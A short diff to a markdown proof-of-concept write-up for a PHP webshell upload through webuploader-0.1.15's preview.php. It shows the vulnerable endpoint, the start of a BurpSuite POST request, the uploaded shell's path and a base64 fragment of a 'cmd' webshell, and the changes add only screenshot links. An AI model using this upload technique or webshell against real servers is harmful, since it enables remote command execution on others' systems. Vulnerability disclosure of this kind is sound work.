@@ -27,7 +27,7 @@ PD9waHANCiAgICBpZihpc3NldCgkX1JFUVVFU1RbJ2NtZCddKSl7DQogICAgICAgICAgICBlY2hvICI8
 ## 0x01 POST upload php webshell
 
 `http://192.168.2.18/webuploader-0.1.15-Demo/server/preview.php`
-
+![](./burpsuite.jpg)
 #### BurpSuite Requests
 ```
 POST /webuploader-0.1.15-Demo/server/preview.php HTTP/1.1
@@ -63,4 +63,5 @@ Content-Length: 142
 `http://192.168.2.18/webuploader-0.1.15-Demo/server/preview/fe8db86134e6505da6f3c4a112b0bad7.php`
 
 ![](./phpinfo.jpg)
+
 ![](./cmd.jpg)
